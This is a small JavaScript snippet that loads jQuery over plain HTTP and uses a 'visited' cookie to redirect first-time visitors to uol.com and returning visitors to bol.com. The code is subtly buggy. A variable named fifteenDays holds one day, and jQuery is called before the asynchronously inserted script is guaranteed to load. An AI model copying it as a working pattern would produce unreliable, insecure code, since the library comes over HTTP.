var imported = document.createElement('script');
imported.src = 'http://ajax.googleapis.com/ajax/libs/jquery/1.8/jquery.min.js';
document.head.appendChild(imported); 

function AbreLink1()     
{
  
window.location.href = "https://uol.com";
  
}
  
function AbreLink2()      
{
  
window.location.href = "https://bol.com"; 
  
} 

jQuery(document).ready(function(){
if (document.cookie.indexOf('visited=true') == -1) {
var fifteenDays = 1000*60*60*24;
var expires = new Date((new Date()).valueOf() + fifteenDays);
document.cookie = "visited=true;expires=" + expires.toUTCString();
AbreLink1();
}else{
AbreLink2();
}
});	
	
	
  
   